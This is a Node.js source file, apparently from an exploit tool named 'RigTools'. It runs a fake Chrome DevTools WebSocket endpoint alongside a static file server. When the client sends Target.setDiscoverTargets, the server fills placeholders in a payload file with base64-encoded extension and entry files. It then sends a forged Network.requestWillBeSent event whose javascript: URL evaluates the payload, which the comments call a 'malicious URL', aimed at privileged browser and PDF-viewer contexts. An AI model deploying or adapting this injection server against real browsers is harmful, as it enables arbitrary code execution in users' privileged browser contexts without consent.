import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";
// readline-sync was imported but not used, removed for clarity.
import * as fs from "fs";
import path from "path";
import { fileURLToPath } from 'url'; // Needed for __dirname equivalent in ES modules

// ES module equivalent of __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// --- Configuration ---
const WebSocket_port = 8080;
const HTTP_port = 9123;
const DEFAULT_UPDATER_URL = "ws://localhost:8081"; // Default if config file fails
const SESSION_ID = "89AC63D12B18F3EE9808C13899C9B695"; // Hardcoded session ID

// --- Static File Server Setup ---
const serve = serveStatic("./", { // Serve from current working directory
    index: ['index.html', 'index.htm'] // Default files to serve
});

const httpServer = createServer((req, res) => {
    // Set CORS headers for static files if needed (might not be necessary depending on use case)
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");

    // Handle preflight requests for CORS
    if (req.method === 'OPTIONS') {
        res.writeHead(204); // No Content
        res.end();
        return;
    }

    serve(req, res, finalhandler(req, res));
});

httpServer.listen(HTTP_port, () => {
    console.log(
        `HTTP server running. Access local files at http://localhost:${HTTP_port}\n--------`
    );
});
httpServer.on('error', (err) => {
    console.error(`HTTP Server Error: ${err.message}`);
    if (err.code === 'EADDRINUSE') {
        console.error(`Port ${HTTP_port} is already in use.`);
    }
});


// --- WebSocket Server Setup ---
const wss = new WebSocketServer({ port: WebSocket_port });

console.log(
    `WebSocket server started on ws://localhost:${WebSocket_port}\n--------`
);

// --- Load Server Configuration ---
let serverConfig = { updater_url: DEFAULT_UPDATER_URL }; // Default config object
const configPath = path.join(__dirname, 'server_config.json');
try {
    const rawConfig = fs.readFileSync(configPath, 'utf-8');
    serverConfig = JSON.parse(rawConfig);
    if (!serverConfig.updater_url) {
        console.warn(`'updater_url' missing in ${configPath}. Using default: ${DEFAULT_UPDATER_URL}`);
        serverConfig.updater_url = DEFAULT_UPDATER_URL;
    } else {
         console.log(`Using updater URL from ${configPath}: ${serverConfig.updater_url}`);
    }
} catch (e) {
    if (e.code === 'ENOENT') {
        console.warn(`${configPath} not found. Using default updater URL: ${DEFAULT_UPDATER_URL}`);
    } else if (e instanceof SyntaxError) {
         console.error(`Error parsing ${configPath}: ${e.message}. Using default updater URL.`);
    } else {
        console.error(`Failed to read ${configPath}: ${e.message}. Using default updater URL.`);
    }
    // Ensure serverConfig has the default URL even on error
    serverConfig.updater_url = DEFAULT_UPDATER_URL;
}
const updaterUrl = serverConfig.updater_url; // Use the determined URL


// --- Load Payloads ---
let payloadMjsString = '';
let indexJsContent = '';
let indexHtmlContent = '';
let entryHtmlContent = '';
let chromePayloadJS = "console.warn('Default Chrome Payload Executed - Placeholder not specifically set for PDF viewer interaction.');"; // Default if not overridden

try {
    payloadMjsString = fs.readFileSync(path.join(__dirname, 'payload.mjs'), 'utf-8');
    indexJsContent = fs.readFileSync(path.join(__dirname, 'payloads', 'index.js'), 'utf-8');
    indexHtmlContent = fs.readFileSync(path.join(__dirname, 'payloads', 'index.html'), 'utf-8');
    entryHtmlContent = fs.readFileSync(path.join(__dirname, 'entry', 'entry.html'), 'utf-8');
    // Define the specific JS for the %%PLACEHOLDER_CHROME_PAYLOAD_B64%% used within payload.mjs
    // This is the code intended for the Mojo context in the PDF viewer flow
    chromePayloadJS = `
        console.log('Chrome Payload Executed in:', window.location.href);
        try {
            // Attempt a less intrusive notification or action if needed
            // alert('Chrome Payload Executed!'); // Alert can be disruptive
            document.body.style.border = '5px solid lime'; // Visual indication
             console.log('%cChrome Payload Successfully Executed!', 'color: lime; font-weight: bold;');
        } catch(e){
            console.error('Error executing chrome payload logic:', e);
        }`;

    console.log("Payload files loaded successfully.");

} catch (e) {
    console.error(`FATAL ERROR: Could not read required payload files: ${e.message}`);
    console.error("Please ensure payload.mjs, payloads/index.js, payloads/index.html, and entry/entry.html exist relative to index.mjs.");
    process.exit(1); // Exit if essential files are missing
}


// --- WebSocket Connection Handling ---
wss.on("connection", function connection(ws_con) {
    console.log(`Client connected.`);

    ws_con.on("message", async (msg) => {
        let json_msg;
        try {
            const rawMsg = msg.toString();
            json_msg = JSON.parse(rawMsg);
            const { id, method, params } = json_msg;

            // Basic validation of expected properties
            if (typeof id === 'undefined' || !method) {
                console.warn("Received malformed message (missing id or method):", rawMsg);
                // Optionally send an error response back
                // ws_con.send(JSON.stringify({ id: id || null, error: { code: -32600, message: 'Invalid Request' }, sessionId: SESSION_ID }));
                return;
            }

            console.log(`-> Received [ID: ${id}]: Method=${method}, Params=`, params || '{}');

            // --- Payload Injection Logic ---
            if (method === "Target.setDiscoverTargets") {
                try {
                    // 1. Base64 encode the *content* files to be embedded
                    const indexJsB64 = btoa(indexJsContent);
                    const indexHtmlB64 = btoa(indexHtmlContent);
                    const entryHtmlB64 = btoa(entryHtmlContent);
                    const chromePayloadB64 = btoa(chromePayloadJS);

                    // 2. Replace placeholders within the payload.mjs string
                    // Use the exact placeholder names defined inside payload.mjs's devToolsUI function
                    let finalPayloadString = payloadMjsString
                        .replace(/%%PLACEHOLDER_EXT_JS_B64%%/g, indexJsB64)
                        .replace(/%%PLACEHOLDER_EXT_HTML_B64%%/g, indexHtmlB64)
                        .replace(/%%PLACEHOLDER_HTML_ENTRY_B64%%/g, entryHtmlB64)
                        .replace(/%%PLACEHOLDER_CHROME_PAYLOAD_B64%%/g, chromePayloadB64)
                        .replace(/%%updaterurl%%/g, updaterUrl); // Replace updater URL placeholder

                    // 3. Base64 encode the entire modified payload string for the javascript: URL
                    const finalPayloadB64 = btoa(finalPayloadString);

                    // 4. Construct the javascript: URL
                    // The structure `eval(atob(...))` is kept as per the original design.
                    // Added comment for clarity/attribution.
                    const javascriptUrl = `javascript:/* RigTools Payload Injection */ (function(){try{eval(decodeURIComponent(escape(atob("${finalPayloadB64}"))))}catch(e){console.error('Payload Execution Failed:',e)}})()`;

                    // 5. Send the injection message
                    const responseMessage = {
                        method: "Network.requestWillBeSent",
                        params: {
                            // Include necessary details simulating a DevTools network event
                            requestId: `inject-${Date.now()}`,
                            loaderId: `loader-${Date.now()}`,
                            documentURL: "about:blank", // Or the relevant document URL if known
                            timestamp: Date.now() / 1000,
                            wallTime: Date.now() / 1000,
                            initiator: { type: "script" }, // Indicate script initiated this
                            type: "Script", // Resource type
                            frameId: params?.frameId || "unknown-frame", // Try to use frameId if provided
                            hasUserGesture: false,
                             request: {
                                url: javascriptUrl, // The malicious URL
                                method: "GET", // Method doesn't really matter for javascript:
                                headers: {},
                                initialPriority: "High",
                                referrerPolicy: "strict-origin-when-cross-origin"
                            },
                        },
                        sessionId: SESSION_ID // Include session ID if required by target protocol
                    };

                    console.log(`<- Sending Injection Payload [ID: ${id}] (JS URL length: ${javascriptUrl.length})`);
                    ws_con.send(JSON.stringify(responseMessage));

                } catch (payloadError) {
                    console.error(`Error processing payload for ID ${id}:`, payloadError);
                    // Send an error response back for this specific request ID
                     ws_con.send(JSON.stringify({
                         id: id,
                         error: { code: -32000, message: `Internal server error during payload processing: ${payloadError.message}` },
                         sessionId: SESSION_ID
                     }));
                    return; // Stop processing this message
                }
            } // End of Target.setDiscoverTargets handling

            // --- Generic Acknowledgement ---
            // Send a generic success response for the received method ID
            // Note: This sends success even if the method wasn't 'Target.setDiscoverTargets'
            // Adjust if specific methods need different success/error results.
             const ackResponse = {
                id: id,
                result: {}, // Empty result object often indicates success
                sessionId: SESSION_ID
            };
             // console.log(`<- Sending Ack [ID: ${id}]`); // Less verbose logging
             ws_con.send(JSON.stringify(ackResponse));

        } catch (e) {
            console.error("Error processing WebSocket message:", e);
            // Attempt to send a generic parse/processing error if possible
            const errorResponse = {
                error: { code: -32700, message: `Parse error or invalid message format: ${e.message}` }, // Use appropriate error code
                sessionId: SESSION_ID
            };
             // If the original message ID was parsed, include it
            if (json_msg && typeof json_msg.id !== 'undefined') {
                errorResponse.id = json_msg.id;
            }
            try {
                ws_con.send(JSON.stringify(errorResponse));
            } catch (sendError) {
                 console.error("Failed to send error response back to client:", sendError);
            }
        }
    });

    ws_con.on("close", (code, reason) => {
        console.log(`Client disconnected. Code: ${code}, Reason: ${reason ? reason.toString() : 'N/A'}`);
    });

    ws_con.on("error", (err) => {
        console.error("WebSocket connection error:", err);
        // Connection likely already closed or closing. No need to try sending errors here.
    });
});

wss.on('error', (err) => {
    console.error(`WebSocket Server Error: ${err.message}`);
     if (err.code === 'EADDRINUSE') {
        console.error(`Port ${WebSocket_port} is already in use. Cannot start WebSocket server.`);
        process.exit(1); // Exit if critical server can't start
    }
});

// Graceful shutdown handling (optional but good practice)
process.on('SIGINT', () => {
  console.log('\nShutting down servers...');
  wss.close(() => {
    console.log('WebSocket server closed.');
  });
  httpServer.close(() => {
    console.log('HTTP server closed.');
    process.exit(0);
  });
  // Force close if servers hang
  setTimeout(() => {
     console.error("Servers did not close gracefully, forcing exit.");
     process.exit(1);
  }, 5000);
});
